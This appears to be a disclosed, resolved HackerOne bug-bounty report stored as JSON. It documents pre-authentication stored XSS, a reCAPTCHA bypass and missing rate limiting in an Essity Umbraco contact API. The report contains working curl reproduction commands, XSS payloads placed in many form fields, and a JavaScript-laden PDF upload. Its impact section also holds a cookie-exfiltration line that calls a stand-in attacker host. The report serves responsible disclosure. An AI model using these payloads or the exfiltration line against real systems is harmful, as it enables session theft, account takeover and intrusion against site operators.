@@ -1,0 +1,129 @@
+{
+  "id": 3729501,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzI5NTAx",
+  "url": "https://hackerone.com/reports/3729501",
+  "title": "Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-12T12:23:22.659Z",
+  "submitted_at": "2026-05-12T12:23:22.988Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "matty69v",
+    "url": "/matty69v",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/d9drin7bro3d44gr64nbpghu6pik/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 109248,
+    "url": "https://hackerone.com/essity",
+    "handle": "essity",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Essity",
+      "twitter_handle": "",
+      "website": "http://essity.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-08-27T07:35:43.411Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-07-01T10:24:19.648Z",
+  "team_member_agreed_on_going_public_at": "2026-08-27T07:35:43.226Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nThe Essity customer contact API (`ContactApi.SavePersonalContactExtended` and `SaveProductContactExtended`) accepts unauthenticated ticket submissions with arbitrary HTML/JavaScript in 12+ fields, bypassing reCAPTCHA validation, CSRF protection, and rate limiting. When customer-service operators view these tickets in the Umbraco back-office, the stored XSS executes in their authenticated session, enabling account takeover, code execution, and cross-tenant attacks against sibling Essity brands.\n\n## Target Endpoints\n\n- `POST https://████████/Umbraco/Api/ContactApi/SavePersonalContactExtended/`\n- `POST https://████████/Umbraco/Api/ContactApi/SaveProductContactExtended/`\n- `POST https://████████/Umbraco/Api/ContactApi/SaveAttachment`\n\nReachable on all in-scope locale paths: `/at`, `/bg`, `/cz`, `/de`, `/ee`, `/gr`, `/hr`, `/hu`, `/lt`, `/lv`, `/ro`, `/rs`, `/ru`, `/ua`, and root `https://zewa.net/`.\n\n## Stacked Vulnerabilities\n\n| # | Control | Status |\n|---|---------|--------|\n| 1 | reCAPTCHA v2 verification | Server accepts empty `ReCaptcha=` parameter; validation is client-side only |\n| 2 | CSRF token | None present; endpoint accepts requests with zero cookies |\n| 3 | Origin/Referer check | None; `Access-Control-Allow-Origin: *` permits cross-origin attacks |\n| 4 | Input sanitization | None; `<script>`, `<img onerror>`, `<svg onload>`, `javascript:` URIs accepted in all text fields |\n| 5 | Email validation | Broken; `\"<script>alert(1)</script>\"@a.com` accepted |\n| 6 | Rate limiting | None; 8 tickets submitted in 2 seconds, all successful |\n| 7 | SiteId authorization | Not enforced; any tenant ID accepted, enabling cross-brand attacks |\n| 8 | Attachment authorization | Not enforced; unauthenticated uploads immediately referenceable in tickets |\n\n## Steps To Reproduce\n\n### Step 1: Stage malicious attachment (no authentication required)\n\n```bash\n# Create PDF with JavaScript payload\nprintf '%PDF-1.3\\n1 0 obj\\n<< /OpenAction << /JS (app.alert(1)) >> >>\\nendobj\\ntrailer << /Root 1 0 R >>\\n%%EOF\\n' > /tmp/jsx.pdf\n\ncurl -sk \\\n  -H 'User-Agent: Mozilla/5.0' \\\n  -H 'X-HackerOne-Research: matty69v' \\\n  -e 'https://████████/de/kontakt/' \\\n  -F 'file=@/tmp/jsx.pdf;type=application/pdf' \\\n  'https://████████/Umbraco/Api/ContactApi/SaveAttachment'\n```\n\n**Response:**\n```json\n[\"3ef49a63-e18f-40d2-94d6-5289c80f9efd_jsx.pdf\"]\n```\n\n### Step 2: Create malicious ticket with stored XSS payload\n\n```bash\ncurl -sk \\\n  -H 'User-Agent: Mozilla/5.0' \\\n  -H 'X-HackerOne-Research: matty69v' \\\n  -e 'https://████████/de/kontakt/' \\\n  -X POST 'https://████████/Umbraco/Api/ContactApi/SavePersonalContactExtended/' \\\n  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\\n  --data-urlencode 'SiteId=1896' \\\n  --data-urlencode 'CultureId=1031' \\\n  --data-urlencode 'ContactReason=Query' \\\n  --data-urlencode 'Title=Mr' \\\n  --data-urlencode 'FirstName=<img src=x onerror=\"alert(document.domain)\">' \\\n  --data-urlencode 'LastName=<svg/onload=alert(document.domain)>' \\\n  --data-urlencode 'Email=\"<script>alert(1)</script>\"@example.com' \\\n  --data-urlencode 'CompareEmail=\"<script>alert(1)</script>\"@example.com' \\\n  --data-urlencode 'Address=<a href=\"javascript:alert(1)\">Click</a>' \\\n  --data-urlencode 'PostalCode=00000' \\\n  --data-urlencode 'City=<iframe src=javascript:alert(1)>' \\\n  --data-urlencode 'Country=DE' \\\n  --data-urlencode 'Message=<script>alert(\"XSS in Message field\")</script>' \\\n  --data-urlencode 'ContactMethods[0]=Email' \\\n  --data-urlencode 'Phone=<img src=x onerror=alert(1)>' \\\n  --data-urlencode 'Question=<svg onload=alert(2)>' \\\n  --data-urlencode 'ProductConcerned=<b>test</b>' \\\n  --data-urlencode 'CoreCode=Z' \\\n  --data-urlencode 'Store=<u>store</u>' \\\n  --data-urlencode 'ReCaptcha=' \\\n  --data-urlencode 'AttachmentFilename[0]=3ef49a63-e18f-40d2-94d6-5289c80f9efd_jsx.pdf' \\\n  --data-urlencode \"PageUrl=javascript:alert('pageurl')\" \\\n  --data-urlencode 'Referrer=https://example.com/' \\\n  --data-urlencode 'SourceTags=<x>' \\\n  --data-urlencode 'UserAgent=<x onerror=alert(ua)>' \\\n  --data-urlencode 'ProvidedConsumerConsents[0][Id]=5' \\\n  --data-urlencode 'ProvidedConsumerConsents[0][IsChecked]=true' \\\n  --data-urlencode 'ProvidedConsumerConsents[0][IsNewsletter]=true'\n```\n\n**Response:**\n```json\n{\"success\":true,\"message\":\"\",\"log\":null,\"redirect\":false,\"redirectUrl\":null}\n```\n\n### Step 3: Trigger execution\n\nWhen a customer-service operator logs into the Umbraco back-office and opens the ticket for review, the JavaScript in any of the 12 injected fields executes in their authenticated session.\n\n### Step 4: Verify no rate limiting\n\nEight consecutive submissions with empty `ReCaptcha=` from a single IP, all within 2 seconds:\n\n```bash\nfor i in {1..8}; do\n  curl -sk -X POST 'https://████████/Umbraco/Api/ContactApi/SavePersonalContactExtended/' \\\n    -H 'Content-Type: application/x-www-form-urlencoded' \\\n    -H 'X-HackerOne-Research: matty69v' \\\n    --data-urlencode \"FirstName=ratepoc-$i\" \\\n    --data-urlencode 'LastName=Test' \\\n    --data-urlencode 'Email=test@mailinator.com' \\\n    --data-urlencode 'CompareEmail=test@mailinator.com' \\\n    --data-urlencode 'SiteId=1896' \\\n    --data-urlencode 'CultureId=1031' \\\n    --data-urlencode 'ContactReason=Query' \\\n    --data-urlencode 'ReCaptcha='\ndone\n```\n\nAll 8 requests returned `{\"success\":true}`.\n\n## Cross-Tenant Pivot\n\nThe `SiteId` parameter accepts any valid tenant ID without authorization checks. Testing confirmed tickets can be submitted to sibling Essity brands:\n\n```bash\n# Enumerate tenant IDs via CountryPicker IDOR\ncurl -sk 'https://████████/umbraco/Surface/CountryPickerSurface/CountryModal?siteId=1901'\n```\n\nResponse reveals multiple brands:\n- `https://████████`\n- `https://www.████████`\n- `https://www.████████`\n- `https://www.████████`\n- `https://www.████████`\n- `https://www.████████`\n\nAn attacker targeting only `████████` can inject XSS into the customer-service back-office of any sibling brand by changing the `SiteId` parameter.\n\n## Technical Details\n\n**Stack:** ASP.NET Core MVC + Umbraco CMS (build hash `639140017071417623`), Cloudflare CDN (no bot challenge on this path)\n\n**Why existing controls fail:**\n- reCAPTCHA token is collected client-side but never validated server-side\n- Honeypot field `contact_me_by_fax_only=1` is documented in public JS; bots already include it\n- Cloudflare is configured for CDN, not bot management; 30+ requests from one IP triggered no challenge\n\n**Vulnerable fields (12 total):**\nFirstName, LastName, Email, CompareEmail, Address, City, Country, Message, Phone, Question, ProductConcerned, CoreCode, Store, PageUrl, Referrer, SourceTags, UserAgent\n\n## Supporting Material/References\n\n- PoC scripts demonstrating the full attack chain\n- Evidence of 8/8 successful submissions bypassing reCAPTCHA\n- Cross-tenant SiteId enumeration results\n- Malicious PDF upload bypassing file validation\n\n## Impact\n\n## Back-Office Account Takeover\n\nWhen an operator opens a malicious ticket in the Umbraco back-office, the stored XSS executes with their privileges (typically Editor, Writer, Translator, or Administrator roles). The attacker can:\n\n1. **Exfiltrate session credentials**: Steal cookies, anti-XSRF tokens via `fetch('https://attacker.tld/?c='+document.cookie)`\n2. **Create administrator accounts**: Call `/umbraco/management/api/v1/...` or `/umbraco/backoffice/UmbracoApi/...` endpoints in the operator's context\n3. **Install malicious packages**: Upload and execute Umbraco packages containing server-side code, achieving RCE on the CMS host serving 14+ brand sites\n4. **Modify content**: Alter published pages, member data, or site configuration\n\nThe operator dependency is not a meaningful barrier—reviewing inbound customer messages is the operator's primary job function, guaranteeing payload execution.\n\n## Mass Ticket Injection from Any Browser\n\n`Access-Control-Allow-Origin: *` combined with no cookie requirement enables drive-by attacks:\n- Malicious ad or compromised page can submit tickets from every visitor's browser\n- Attacker's IP is invisible (requests originate from legitimate visitors)\n- No rate limiting allows flooding the ticket queue in minutes\n\n## Phishing Pipeline to Internal Staff\n\nThe attachment chain delivers attacker-controlled files into the operator's workflow:\n- **Malicious PDFs** with JavaScript `OpenAction` execute when opened in Acrobat\n- **Office documents** with macros run code on internal workstations\n- **ZIP archives** containing LNK/EXE payloads for lateral movement\n\nFile validation checks magic bytes for images but accepts PDF/DOCX/ZIP by extension only, confirmed with PoC PDF containing `app.alert(1)`.\n\n## Cross-Brand Attack Surface\n\nA single attacker targeting `████████` can inject XSS into customer-service systems for multiple Essity brands (Lotus, Cushelle, Colhogar, Edet, papelregio) by manipulating the `SiteId` parameter. This creates:\n- **Operational disruption** across multiple brand support teams\n- **Reputational damage** spanning the entire Essity portfolio\n- **Investigation complexity** when malicious tickets appear to originate from legitimate brand domains\n\n## GDPR Article 32 Breach\n\nMarketing consent flags (`ProvidedConsumerConsents[i][IsChecked]`) are accepted server-side with no verification. Attackers can:\n- Create subscriptions in victims' names without consent\n- Prevent Essity from demonstrating valid consent under Article 7\n- Trigger data protection liability for every persisted fake subscription\n\n## Severity Justification\n\n**CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L** → **9.0 Critical**\n\n- **Attack Vector: Network** - Remotely exploitable from any internet connection\n- **Attack Complexity: Low** - No special preparation beyond standard HTTP requests\n- **Privileges Required: None** - Completely unauthenticated\n- **User Interaction: Required** - Operator must open the ticket (guaranteed by job function)\n- **Scope: Changed** - XSS executes in privileged back-office context, different from anonymous submission context\n- **Confidentiality: High** - Access to operator session, customer PII, internal CRM data\n- **Integrity: High** - Ability to modify CMS content, create accounts, install code\n- **Availability: Low** - Ticket flood can disrupt support operations but not destroy the platform",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 3,
+  "voters": [
+    "matty69v",
+    "sumit-sabhaya",
+    "stackraid"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.4,
+    "author_type": "User",
+    "cvss_4_point_0_metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "attack_requirements": "none",
+      "privileges_required": "none",
+      "user_interaction": "passive",
+      "vulnerable_confidentiality": "high",
+      "vulnerable_integrity": "high",
+      "vulnerable_availability": "low",
+      "subsequent_confidentiality": "high",
+      "subsequent_integrity": "high",
+      "subsequent_availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 991841,
+    "asset_type": "URL",
+    "asset_identifier": "https://zewa.net",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
